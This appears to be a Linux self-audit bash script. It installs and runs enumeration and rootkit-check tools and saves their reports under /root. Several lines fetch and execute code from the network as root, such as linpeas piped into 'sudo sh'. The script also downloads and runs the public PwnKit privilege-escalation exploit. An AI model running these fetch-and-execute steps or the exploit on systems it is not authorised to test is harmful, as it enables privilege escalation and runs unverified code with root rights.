#!/usr/bin/env bash

set -o nounset
set -o pipefail

#----------------------------------------------------------------------------------------

if [[ "${TRACE-0}" == "1" ]]; then
    set -o xtrace
fi

#----------------------------------------------------------------------------------------

if [[ "${1-}" =~ ^-*h(elp)?$ ]]; then
    echo 'Usage: ./audit.sh
 
This is bash script to install and run audit/pentest tools for Linux.
'
    exit
fi

#----------------------------------------------------------------------------------------

sudo apt update && sudo apt upgrade -y && sudo apt autoremove --purge -y
sudo mkdir -p /root/audit-results
#----------------------------------------------------------------------------------------

echo -e "\nLynis running..."
cd /tmp && git clone https://github.com/CISOfy/lynis
cd lynis && sudo ./lynis audit system --pentest > /root/audit-results/lynis.txt

echo -e "\nLinpeas running..."
cd /tmp && curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sudo sh > /root/audit-results/linpeas.txt

echo -e "\nLinEnum running..."
cd /tmp && git clone https://github.com/rebootuser/LinEnum.git
cd LinEnum && sudo ./LinEnum.sh > /root/audit-results/linenum.txt

echo -e "\nLinux Exploit Suggester running..."
cd /tmp && git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git
cd linux-exploit-suggester && sudo ./linux-exploit-suggester.sh > /root/audit-results/les.txt

echo -e "\nLinux Exploit Suggester 2 running..."
cd /tmp && git clone https://github.com/jondonas/linux-exploit-suggester-2.git
cd linux-exploit-suggester-2 && sudo ./linux-exploit-suggester-2.pl > /root/audit-results/les2.txt

echo -e "\nLinux Smart Enumeration running..."
cd /tmp && wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh
sudo chmod 700 lse.sh && sudo ./lse.sh > /root/audit-results/lse.txt

echo -e "\nchkrootkit running..."
sudo apt install gcc -y
cd /tmp && wget https://src.fedoraproject.org/repo/pkgs/chkrootkit/chkrootkit-0.57.tar.gz/sha512/ff35f01042bc68bdd10c4e26dbde7af7127768442c7a10f114260188dcc7e357e2c48d157c0b83b99e2fd465db3ed3933c84ae12fa411c5c28f64b955e742ff7/chkrootkit-0.57.tar.gz && tar -xzf chkrootkit-0.57.tar.gz && cd chkrootkit-0.57/
sudo make sense
sudo chmod 700 chkrootkit && sudo ./chkrootkit > /root/audit-results/chkrootkit.txt

echo -e "\nrkhunter running..."
cd /tmp && wget http://sourceforge.net/projects/rkhunter/files/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz && tar zxvf rkhunter-1.4.6.tar.gz && cd rkhunter-1.4.6
sudo ./installer.sh --install
sudo rkhunter --check
sudo mv /var/log/rkhunter.log /root/audit-results/

echo -e "\nPwnKit running..."
USERNAME_FIRST=`id -nu 1000`
sudo -H -u $USERNAME_FIRST bash -c 'cd /tmp && curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit && chmod +x ./PwnKit && ./PwnKit 'id''

#----------------------------------------------------------------------------------------

echo -e "\n\nLinux Audit Result Here: /root/audit-results\n"

ls -al /root/audit-results

echo -e "\nPlease, use the utility 'more' to view reports.\n"

exit 0